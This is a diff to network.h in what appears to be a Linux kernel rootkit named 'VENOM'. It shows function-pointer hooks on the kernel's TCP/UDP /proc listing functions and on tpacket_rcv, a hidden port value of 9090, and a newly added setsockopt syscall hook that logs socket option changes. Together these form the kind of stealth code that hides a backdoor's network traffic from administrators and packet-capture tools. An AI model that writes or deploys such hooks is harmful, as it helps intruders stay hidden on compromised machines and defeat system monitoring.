@@ -30,6 +30,7 @@
  * Author: Trevohack 
 */ 
 
+
 #ifndef NETWORK_H
 #define NETWORK_H
 
@@ -39,9 +40,10 @@
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
-static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v);
-static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
-                               struct packet_type *pt, struct net_device *orig_dev);
+static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v); 
+static asmlinkage long (*orig_setsockopt)(const struct pt_regs *regs); 
+static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev); 
+
 
 
 static int g_hidden_port = 9090;
@@ -210,6 +212,24 @@ static notrace int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *de
 
 out:
     return orig_tpacket_rcv(skb, dev, pt, orig_dev);
+}
+
+
+
+notrace static asmlinkage long hooked_setsockopt(const struct pt_regs *regs) {
+    int sockfd = (int)regs->di;
+    int level = (int)regs->si;
+    int optname = (int)regs->dx;
+    
+    if (level == SOL_SOCKET && optname == SO_RCVBUF) {
+        TLOG_INF("[VENOM] Socket buffer modified by %s", current->comm);
+    }
+    
+    if (level == SOL_PACKET) {
+        TLOG_WARN("[VENOM] RAW PACKET socket option by %s", current->comm);
+    }
+    
+    return orig_setsockopt(regs);
 }
 
 #endif 
